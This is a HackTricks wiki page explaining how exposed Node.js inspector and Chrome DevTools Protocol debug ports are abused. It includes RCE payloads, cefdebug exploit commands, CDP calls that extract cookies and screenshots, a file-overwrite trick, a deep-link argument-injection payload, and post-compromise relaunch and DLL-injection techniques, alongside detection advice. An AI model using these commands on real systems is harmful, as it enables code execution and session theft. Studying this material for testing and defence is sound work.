---
title: "Node inspector/CEF debug abuse"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/linux-hardening/software-information/electron-cef-chromium-debugger-abuse.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: linux
---

## Basic Information

[From the docs](https://nodejs.org/learn/getting-started/debugging): When started with the `--inspect` switch, a Node.js process listens for a debugging client. By **default**, it will listen at host and port **`127.0.0.1:9229`**. Each process is also assigned a **unique** **UUID**.[\[4\]](#references)

Inspector clients must know and specify host address, port, and UUID to connect. A full URL will look something like `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`.[\[4\]](#references)

Warning

Since the **debugger has full access to the Node.js execution environment**, a malicious actor able to connect to this port may be able to execute arbitrary code on behalf of the Node.js process (**potential privilege escalation**).[\[4\]](#references)

There are several ways to start an inspector:[\[4\]](#references)

```
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script
node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
When you start an inspected process something like this will appear:[\[4\]](#references)

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
Processes based on **CEF** (**Chromium Embedded Framework**) can expose a debugger with `--remote-debugging-port=9222`. This exposes the browser through the [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) rather than a Node.js inspector, so Node.js `process`-based payloads are not directly applicable by default.[\[2\]](#references)[\[5\]](#references)

When you start a debugged browser something like this will appear:[\[2\]](#references)[\[5\]](#references)

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### Enumerating and driving a CDP endpoint

The HTTP discovery endpoints distinguish the **browser** WebSocket from individual **target** (tab, worker, extension, etc.) WebSockets. Query `/json/version` for the browser endpoint and `/json/list` for targets; the returned `webSocketDebuggerUrl` values can then be driven directly with CDP’s JSON-RPC-like messages.[\[5\]](#references)

```
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq
# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'
BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
For example, connect with `websocat "$BROWSER_WS"` and send `{"id":1,"method":"Target.getTargets"}` or `{"id":2,"method":"Storage.getCookies"}`. On a page target (`websocat "$PAGE_WS"`), `Runtime.evaluate` executes in that renderer and `Page.captureScreenshot` returns a base64-encoded screenshot. `document.cookie` cannot reveal `HttpOnly` cookies, whereas `Storage.getCookies` asks the browser for its cookie store.[\[5\]](#references)

```
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### Browsers, WebSockets and same-origin policy

Websites open in a web-browser can make WebSocket and HTTP requests under the browser security model. An **initial HTTP connection** is necessary to **obtain a unique debugger session id**. The **same-origin-policy** **prevents** websites from being able to make **this HTTP connection**. For additional security against **DNS rebinding attacks****,** Node.js verifies that the **‘Host’ headers** for the connection either specify an **IP address** or **`localhost`** precisely.[\[4\]](#references)

This **security measures prevents exploiting the inspector** to run code by **just sending a HTTP request** (which could be done exploiting a SSRF vuln).[\[4\]](#references)

### Starting inspector in running processes

You can send the **signal SIGUSR1** to a running nodejs process to make it **start the inspector** in the default port. However, note that you need to have enough privileges, so this might grant you **privileged access to information inside the process** but no a direct privilege escalation.[\[4\]](#references)

```
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

This is useful in containers because **shutting down the process and starting a new one** with `--inspect` is **not an option** because the **container** will be **killed** with the process.[\[6\]](#references)

### Connect to inspector/debugger

To connect to a **Chromium-based browser**, the `chrome://inspect` or `edge://inspect` URLs can be accessed for Chrome or Edge, respectively. By clicking the Configure button, it should be ensured that the **target host and port** are correctly listed. The image shows a Remote Code Execution (RCE) example:[\[2\]](#references)[\[4\]](#references)

Using the **command line** you can connect to a debugger/inspector with:[\[2\]](#references)[\[4\]](#references)

```
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
The tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), allows to **find inspectors** running locally and **inject code** into them.[\[2\]](#references)

```
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

Note that **NodeJS RCE exploits won’t work** if connected to a browser via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) (you need to check the API to find interesting things to do with it).[\[2\]](#references)[\[5\]](#references)

## RCE in NodeJS Debugger/Inspector

If you came here looking how to get **RCE from a XSS in Electron please check this page.**

Some common ways to obtain **RCE** when you can **connect** to a Node **inspector** is using something like (looks that this **won’t work in a connection to Chrome DevTools protocol**):[\[2\]](#references)

```
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

You can check the API here: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[\[5\]](#references)</sup>
In this section I will just list interesting things I find people have used to exploit this protocol.

### Chrome 136+ default-profile restriction

Starting with **Chrome 136**, Chrome ignores `--remote-debugging-port` and `--remote-debugging-pipe` when they target the **default Chrome data directory**. The switch must be paired with a non-standard `--user-data-dir`, whose separate encryption key and isolated browser state prevent the simple flag-based technique from exposing the user’s normal authenticated profile. This Chrome-specific restriction should not be assumed to cover older Chrome builds, Chrome for Testing, Electron/CEF applications, or other Chromium derivatives without verification.[\[14\]](#references)

```
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
Therefore, seeing a current Chrome process launched only with `--remote-debugging-port` does **not** prove that CDP became active. Confirm the listener and `/json/version`, and determine which profile actually backs it.[\[14\]](#references)

### Parameter Injection via Deep Links

In the [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) Rhino security discovered that an application based on CEF **registered a custom UR**I in the system (workspaces://index.html) that received the full URI and then **launched the CEF based applicatio**n with a configuration that was partially constructing from that URI.[\[8\]](#references)

It was discovered that the URI parameters where URL decoded and used to launch the CEF basic application, allowing a user to **inject** the flag **`--gpu-launcher`** in the **command line** and execute arbitrary things.[\[8\]](#references)

So, a payload like:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
Will execute a calc.exe.[\[8\]](#references)

### Overwrite Files

Change the folder where **downloaded files are going to be saved** and download a file to **overwrite** frequently used **source code** of the application with your **malicious code**.[\[5\]](#references)[\[6\]](#references)

```
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```
### Webdriver RCE and exfiltration

STAR Labs showed that exposed WebDriver/CDP services can enable arbitrary file reads and RCE; DNS rebinding can complete the exploit chain in some configurations.[\[9\]](#references)

For additional historical browser-automation and Chromium security cases, see the Counter WebDriver write-up and Project Zero issues 773, 1742, and 1944.[\[10\]](#references)[\[11\]](#references)[\[12\]](#references)[\[13\]](#references)

### Enabling CDP inside a live Chromium process

On Windows, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) demonstrated that the command-line restriction is not the only way to activate CDP: code already capable of injecting into an existing `msedge.exe` can invoke Chromium’s non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer` and expose the authenticated live profile without restarting the browser.[\[15\]](#references)

The demonstrated chain injects a DLL with `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread`, resolves internal Edge symbols (first from PDBs and then with version-specific byte signatures), subclasses the browser window, and posts a message so the final server-start call executes on the browser **UI thread**. The socket is bound to loopback, after which normal CDP primitives can retrieve cookies, capture tabs, inspect network traffic, or evaluate JavaScript in authenticated pages.[\[15\]](#references)

Warning

This is a **post-compromise/process-injection** technique, not an unauthenticated network bypass. It is highly build-dependent because the relevant C++ symbols are not exported and signatures can change after browser updates.[\[15\]](#references)

For detection, do not rely only on `--remote-debugging-*` command-line telemetry: also correlate unusual handles and memory operations against browser processes (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection, and unexpected loopback listening sockets owned by Chrome/Edge.[\[15\]](#references)

### Post-Exploitation

In a real environment and **after compromising** a user PC that uses a Chromium-based browser, a historical technique was to relaunch the browser with debugging enabled and forward the loopback port. This can expose the victim’s browsing state on products/builds that still accept the selected profile, but Chrome 136+ will not honor this against its default data directory.[\[7\]](#references)[\[14\]](#references)

The original relaunch command is preserved below for older/version-specific targets. The second command is the supported current-Chrome form, but it creates an isolated profile rather than reopening the victim’s normal authenticated state.[\[7\]](#references)[\[14\]](#references)

```
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"
# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
For macOS-specific Chromium relaunch, extension, and CDP tradecraft, see [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.html).

## References
